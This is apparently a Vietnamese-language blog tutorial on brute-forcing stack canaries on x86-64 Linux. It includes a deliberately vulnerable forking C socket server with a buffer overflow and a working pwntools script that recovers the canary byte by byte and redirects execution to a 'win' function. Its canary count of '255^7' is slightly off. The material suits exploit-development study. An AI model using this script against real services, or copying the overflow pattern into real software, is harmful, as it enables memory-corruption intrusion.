---
title: "Bruteforce Stack Canary x86-64 Linux"
date: 2023-04-28
draft: false
tags: ["bruteforce", "pwn"]
showTableOfContents: true
---
{{< alert >}}
**Images not loading?** Try accessing this site using a VPN.
{{< /alert >}}

## I. Giới thiệu
Như ở bài [trước](https://hackmd.io/OgqVhSZZR3CCszA9GwcrTA) ta đã biết được stack canary là một cơ chế để ngăn chặn buffer overflow. Đây là một giá trị để trước return address và được check trước khi return 1 stack frame nhằm tránh overflow. Do đó để chuyển hướng hoạt động của chương trình, ta cần tấn công bằng 1 trong 2 cách sau: leak hoặc bruteforce stack canary. Trong bài này sẽ tấn công bằng cách thứ 2.

## II. Chương trình khai thác
<details>
<summary>CODE </summary>
    
```clike
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 6969
int client = 0  ;

void vuln(int client_socket) {
    char *output = "vuln read : ";
    char n[10] ;
    send(client_socket, output, strlen(output), 0);
    read(client_socket,n,0x1000);

}

void win()
{
        send(client,"YOU WIN",strlen("YOU WIN"),0) ;
}

int main() {
    int server_fd, new_socket, valread;
    struct sockaddr_in address;
    int addrlen = sizeof(address);

    // Create socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Set socket options
    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
                   &opt, sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    // Bind socket to port
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    // Listen for incoming connections
    if (listen(server_fd, 3) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    while (1) {
        // Accept incoming connection
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address,
                                 (socklen_t *)&addrlen)) < 0) {
            perror("accept");
            exit(EXIT_FAILURE);
        }

        // Fork a new process to handle the connection
        pid_t pid = fork();
        if (pid < 0) {
            perror("fork failed");
            exit(EXIT_FAILURE);
        } else if (pid == 0) {
            // Child process
            close(server_fd);

            // Call prog function and send output to client
            client = new_socket ;
            vuln(new_socket);
            send(new_socket,"NO OVERFLOW\n",strlen("NO OVERFLOW\n"),0);
            close(new_socket);
            exit(EXIT_SUCCESS);
        } else {
            // Parent process
            close(new_socket);
        }
    }

    return 0;
}
```
</details>

Giả sử đây là chương trình chạy trên server và được build bằng lệnh `gcc -o test test.c -no-pie`.

Đọc code thì ta thấy hướng hoạt động của chương trình trên như sau: chương trình tạo socket cho client kết nối ở `localhost 6969` (chạy local trên máy) sau đó với mỗi client kết nối nó sẽ `fork()` chính process này cho client. Ngoài ra ta dễ dàng thấy có lỗi BOF ở `vuln`

Tiếp theo ta tham khảo hàm `fork()`
    
![](https://i.imgur.com/60jZiEO.png)

Đây là một syscall trên linux cho phép ta dublicate process gọi nó. Process con sẽ được spawn ra có cùng content với parent. Điều này đồng nghĩa với giá trị stack canary cũng không đổi

![](https://i.imgur.com/GMiVnyc.png)

Do đó ta có thể lợi dụng nó để bruteforce stack canary
    
## III. Bruteforce
Ta biết được canary ở x86-64 là một số 8 byte mà byte cuối luôn tận cùng là `/x00`
    
![](https://i.imgur.com/6ujrdrt.png)

Do đó sẽ có ít nhất `255^7` tức `70110209207109375` giá trị tồn tại. Vì vậy nếu thử từng số thì không biết khi nào mới xong.

Cho nên ta sẽ sài một hướng khác, và hướng này chính là bruteforces từng byte. Khi ta thử từng byte như vậy, nếu một byte không thoả thì chương trình sẽ exit và báo lỗi, nếu thoả thì chương trình thực thi tiếp và ta sẽ lưu lại byte đó để bruteforce byte kế tiếp.

![](https://bananamafia.dev/img/binary-canary-bruteforce/canary_bruteforce.gif)
    
Cách này tối ưu hơn vì 1 byte có 255 giá trị, và ta có 7 byte cần bruteforce do đó sẽ có nhiều nhất : `255+255+255+255+255+255+255 (1785)` lần thử, và nó thấp đáng kể so với cách kia
    
## IV. Exploit
Ta đã biết hướng khai thác vậy ta sẽ viết script

Đầu tiên ta gdb để tìm offset. Do ta cần debug child process sinh ra từ `fork()` nên ta cần để lệnh này trong gdb

![](https://i.imgur.com/D8B5Usw.png)

Ta nhận thấy ta cần padding 10 byte rồi tới stack canary, sau đó là padding thêm 8 byte, cuối cùng là return address 

![](https://i.imgur.com/PY2GOVB.png)

Tiếp theo ta viết script bruteforce bằng python như sau
    
```python
def brute_cana():
        p = remote("localhost",6969)
        payload = 'A'*10
        canary = "\x00"
        for step in range(0,7):
                for i in range(0,256):
                        leak = b""
                        try:
                                sent = payload + canary + chr(i)
                                p.sendafter(b'vuln read : ',sent)
                                leak = p.recvline()
                        except EOFError:
                                p.close()
                                p.clean()
                                p = remote("localhost",6969)

                        if (len(leak) > 3) :
                                canary += chr(i)
                                break

        print("[+] Canary =",hex(u64(canary)))
        return u64(canary)
```

Ở đây ta tạo một hàm tên `brute_cana`, sau đó ta kết nối với host bruteforce từng byte, nếu bị sai ở byte nào thì ta tiến hành kết nối lại và thực hiện tiếp quá trình trên. Ở đây nếu 1 byte bruteforce thành công thì server sẽ send `NO OVERFLOW` không thì không có gì nên ta lợi dụng nó để biết khi nào làm tiếp byte tiếp theo.

Tiếp theo ta chạy thử thì được canary.

![](https://i.imgur.com/f0gOgFa.png)

Vậy tới đây ta lo được canary, việc còn lại là overwrite return address bằng ret2libc để lấy shell hay ở đây mình ret2win để minh hoạ.

Địa chỉ hàm `win`
    
![](https://i.imgur.com/tBUVMVF.png)

Ở đây ta thấy cần padding 8 byte rồi mới tới ret address
![](https://i.imgur.com/o9TcgVc.png)

Cuối cùng viết script:
```python
def get_shell():
        p = remote("localhost",6969)
        payload = b'a'*10 +p64(brute_cana())+ b'a'*8 + p64(0x40134e)

        p.sendafter(b'vuln read : ',payload)
        p.interactive()
```

- Full script:
```python
from pwn import *
#exe = ELF("test")

def brute_cana():
        p = remote("localhost",6969)
        payload = 'A'*10
        canary = "\x00"
        for step in range(0,7):
                for i in range(0,256):
                        leak = b""
                        try:
                                sent = payload + canary + chr(i)
                                p.sendafter(b'vuln read : ',sent)
                                leak = p.recvline()
                        except EOFError:
                                p.close()
                                p.clean()
                                p = remote("localhost",6969)

                        if (len(leak) > 3) :
                                canary += chr(i)
                                break

        print("[+] Canary =",hex(u64(canary)))
        return u64(canary)

def get_shell():
        p = remote("localhost",6969)
        payload = b'a'*10 +p64(brute_cana())+ b'a'*8 + p64(0x40134e)

        p.sendafter(b'vuln read : ',payload)
        p.interactive()

if __name__ ==  "__main__":
        get_shell()
```

Chạy thử và ta overwrite thành công

![](https://i.imgur.com/aoHxGyj.png)

## V. References
1. [Brute-Forcing x86 Stack Canaries](https://bananamafia.dev/post/binary-canary-bruteforce/)
2. [Fork linux man page](https://man7.org/linux/man-pages/man2/fork.2.html)
